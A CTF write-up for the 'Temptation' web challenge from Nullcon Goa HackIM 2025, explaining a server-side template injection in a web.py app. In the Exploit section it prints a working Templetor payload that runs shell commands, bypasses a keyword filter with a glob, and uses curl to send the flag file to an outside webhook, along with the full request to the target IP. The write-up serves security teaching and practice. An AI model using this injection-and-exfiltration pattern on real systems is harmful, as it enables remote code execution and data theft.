---
title: "Temptation - Nullcon Goa HackIM 2025 CTF"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "ssti", "temptation", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "The challenge presents a cunning attempt to lure participants into a deceptive scheme, offering an untempting temptation that not only invites scrutiny but also appears to exempt itself from redemptio"
source:
  name: "CTFtime writeup #40003"
  url: "https://ctftime.org/writeup/40003"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Temptation"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Temptation
- **Author team:** InfoSecIITR
- **CTFtime:** <https://ctftime.org/writeup/40003>

---
# Web/Temptation

## Description

The challenge presents a cunning attempt to lure participants into a deceptive scheme, offering an untempting temptation that not only invites scrutiny but also appears to exempt itself from redemption.  
## Overview

The challenge begins with a simple input box and a submit button. Inspecting the source code reveals an interesting comment directing us to `/?source`. Navigating to that URL displays the source code of the application:

```python  
import web  
from web import form  
web.config.debug = False

urls = (  
'/', 'index'  
)  
app = web.application(urls, locals())  
render = web.template.render('templates/')  
FLAG = open("/tmp/flag.txt").read()

temptation_Form = form.Form(  
form.Password("temptation", description="What is your temptation?"),  
form.Button("submit", type="submit", description="Submit")  
)

class index:  
def GET(self):  
try:  
i = web.input()  
if i.source:  
return open(__file__).read()  
except Exception as e:  
pass  
f = temptation_Form()  
return render.index(f)

def POST(self):  
f = temptation_Form()  
if not f.validates():  
return render.index(f)  
i = web.input()  
temptation = i.temptation  
if 'flag' in temptation.lower():  
return "Too tempted!"  
try:  
temptation = web.template.Template(f"Your temptation is: {temptation}")()  
except Exception as e:  
return "Too tempted!"  
if str(temptation) == "FLAG":  
return FLAG  
else:  
return "Too tempted!"

application = app.wsgifunc()  
if __name__ == "__main__":  
app.run()  
```

The application processes user input and renders it as part of a template. The flag is stored in `/tmp/flag.txt`, and input containing the word `flag` triggers a rejection message: "Too tempted!".

A critical section is:

```python  
temptation = web.template.Template(f"Your temptation is: {temptation}")()  
```

This dynamically constructs a template using user input, potentially leading to Server-Side Template Injection (SSTI).

## Exploit

The application uses `[web.py](http://web.py)`, and referring to the [Templetor](<https://webpy.org/docs/0.3/templetor>) documentation, we find that `${payload}` can execute Python code. This allows us to craft an SSTI payload to read and exfiltrate the flag.

Our payload:  
```python  
${__import__('os').system('curl -X POST -d "\$(cat /tmp/fl?g.txt)" <https://dragon.requestcatcher.com/hacked'>)}  
```

This payload:  
\- Reads the flag from `/tmp/fl?g.txt`  
\- Uses `?` to bypass the word `flag` filter  
\- Sends the flag to our webhook using `curl`

We send the payload via:

```bash  
curl -X POST http://52.59.124.14:5011/ -d "temptation=\${__import__('os').system('curl -X POST -d \"\$(cat /tmp/fl?g.txt)\" <https://dragon.requestcatcher.com/hacked'>)}&submit=true"  
```

As a result, the flag is successfully received on our webhook.

## FLAG  
`ENO{T3M_Pl4T_3S_4r3_S3cUre!!}`
